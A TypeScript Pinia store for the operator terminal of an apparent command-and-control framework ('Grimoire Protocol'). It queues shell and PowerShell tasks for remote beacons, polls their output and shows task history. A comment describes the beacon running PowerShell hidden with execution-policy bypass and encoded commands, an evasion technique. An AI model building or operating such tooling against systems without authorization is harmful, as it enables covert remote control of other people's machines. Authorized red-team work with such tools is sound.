import { defineStore } from 'pinia';
import apiClient from '@/utils/http';

interface LogEntry {
    type: 'input' | 'output' | 'error' | 'system' | 'easter-egg';
    fullCommand: string;
    content: string;
    timestamp: string;
}

export const useTerminalStore = defineStore('terminal', {
    state: () => ({
        logsMap: {} as Record<string, LogEntry[]>,
        isSending: false,
        supportCommands: ['clear', 'shell', 'history', 'whoami', 'powershell', 'task_history', 'help', 'christmas']
    }),

    actions: {
        // 工具函数：延迟
        sleep(ms: number) {
            return new Promise(resolve => setTimeout(resolve, ms));
        },

        clearLogs(beaconId: string) {
            this.logsMap[beaconId] = [];
        },


        addLog(beaconId: string, entry: LogEntry) {
            if (!this.logsMap[beaconId]) this.logsMap[beaconId] = [];
            this.logsMap[beaconId].push(entry);
        },

        getLogs(beaconId: string) {
            return this.logsMap[beaconId] || [];
        },


        displayHelp(beaconId: string) {
            this.addLog(beaconId, {
                type: 'system',
                fullCommand: 'help',
                content: "[ GRIMOIRE PROTOCOL - COMMAND MENU ]\n" +
                    "---------------------------------------------------------\n" +
                    "LOCAL COMMANDS:\n" +
                    "  help            Display this help menu\n" +
                    "  clear           Clear the terminal screen\n" +
                    "  history         Show command input history\n" +
                    "\n" +
                    "BEACON COMMANDS:\n" +
                    "  whoami          Get current user context\n" +
                    "  shell [cmd]     Execute a shell command\n" +
                    "  powershell [cmd]     Execute a powershell command\n" +
                    "  task_history    Fetch remote task execution logs\n" +
                    "---------------------------------------------------------\n" +
                    "  Tip: Use UP/DOWN arrows to navigate command history.\n"+
                    "  Easter Egg Command       ??? Go and find them~~???\n",
                timestamp: new Date().toLocaleTimeString()
            });
        },

        // 显示本地输入历史 (本地)
        displayLocalHistory(beaconId: string, history: string[]) {
            this.addLog(beaconId, {
                type: 'system',
                fullCommand: 'history',
                content: "--- LOCAL COMMAND HISTORY ---\n" + history.join('\n'),
                timestamp: new Date().toLocaleTimeString()
            });
        },

        //发送命令并轮询结果
        async sendCommand(beaconId: string, fullCommand: string) {
            this.isSending = true;

            // 解析命令 (例如输入 "shell whoami" -> command: "shell", arguments: "whoami")
            const parts = fullCommand.trim().split(/\s+/);
            const command = parts[0];
            let args = parts.slice(1).join(' ');

            // 记录输入
            this.addLog(beaconId, {
                type: 'input',
                fullCommand: fullCommand,
                content: `> ${fullCommand}`,
                timestamp: new Date().toLocaleTimeString(),
            });


            // 因为powershell会很经常的出现"之类的字符
            // 所以我在beacon写的时候用的是powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand
            // 这里base64编码后传回去
            if (command === 'powershell') {
                // base64编码args参数
                const buffer = new Uint16Array(args.length);
                for (let i = 0; i < args.length; i++) {
                    buffer[i] = args.charCodeAt(i);
                }
                const bytes = new Uint8Array(buffer.buffer);

                // 使用这种方式可以避开类型报错
                let binary = '';
                bytes.forEach(b => binary += String.fromCharCode(b));
                args = btoa(binary);
            }

            try {
                // 创建任务
                const createRes = await apiClient.post('/operator/task/create', {
                    beacon_id: beaconId,
                    command: command,
                    arguments: args
                });

                const taskId = createRes.data.task_id;

                this.addLog(beaconId, {
                    type: 'system',
                    fullCommand: fullCommand,
                    content: `[*] Task created: ${taskId}. Waiting for beacon to check-in...`,
                    timestamp: new Date().toLocaleTimeString(),
                });

                // 开始轮询结果
                let output = null;
                let attempts = 0;
                const maxAttempts = 30; // 最多轮询 30 次 (约 1 分钟)

                while (!output && attempts < maxAttempts) {
                    attempts++;

                    const outputRes = await apiClient.get(`/operator/task/output/${taskId}`);

                    // 假设后端在没结果时返回空字符串或特定的状态码
                    if (outputRes.data && outputRes.data.result) {
                        output = outputRes.data.result;
                    } else {
                        // 每 2 秒查一次
                        await this.sleep(2000);
                    }
                }

                // 展示结果
                if (output) {
                    this.addLog(beaconId, {
                        type: 'output',
                        content: atob(output),    //output得base64解码
                        fullCommand: fullCommand,
                        timestamp: new Date().toLocaleTimeString(),
                    });
                } else {
                    this.addLog(beaconId, {
                        type: 'error',
                        fullCommand: fullCommand,
                        content: `[!] Task ${taskId} timed out or returned no output.`,
                        timestamp: new Date().toLocaleTimeString(),
                    });
                }

            } catch (error: any) {
                this.addLog(beaconId, {
                    type: 'error',
                    fullCommand: fullCommand,
                    content: `[!] Error: ${error.response?.data?.msg || 'Communication failed'}`,
                    timestamp: new Date().toLocaleTimeString(),
                });
            } finally {
                this.isSending = false;
            }
        },


        async fetchHistory(beaconId: string) {
            this.isSending = true; // 复用加载状态，让终端显示正在查询
            try {
                const response = await apiClient.get(`/operator/task/history/${beaconId}`);
                const data = response.data;

                this.addLog(beaconId, {
                    type: 'system',
                    fullCommand: 'task_history',
                    content: `[*] Syncing historical tasks for ${beaconId}...`,
                    timestamp: new Date().toLocaleTimeString()
                });

                // 解析返回的 JSON 并渲染到终端
                Object.entries(data).forEach(([tid, task]: [string, any]) => {
                    this.addLog(beaconId, {
                        type: 'output',
                        fullCommand: 'task_history',
                        content: `[TASK ${tid}] ${task.command}: ${task.result || 'No output'}`,
                        timestamp: task.timestamp
                    });
                });
            } catch (error) {
                this.addLog(beaconId, { type: 'error', fullCommand: 'task_history', content: 'Failed to fetch history.', timestamp: '' });
            } finally {
                this.isSending = false;
            }
        },


        merryChristmas(beaconId: string) {
            this.addLog(beaconId, {
                type: 'easter-egg',
                fullCommand: 'christmas',
                content:
                    `         *
        / \\
       /   \\
      / [!] \\
     /   o   \\
    /  o   [!] \\
   / [!]  o  o  \\
  /   o  [!]  o  \\
 /  o  o   o  [!] \\
/__________________\\
        [___]
  MERRY CHRISTMAS!!`,
                timestamp: new Date().toLocaleTimeString(),
            });
        },

    }
});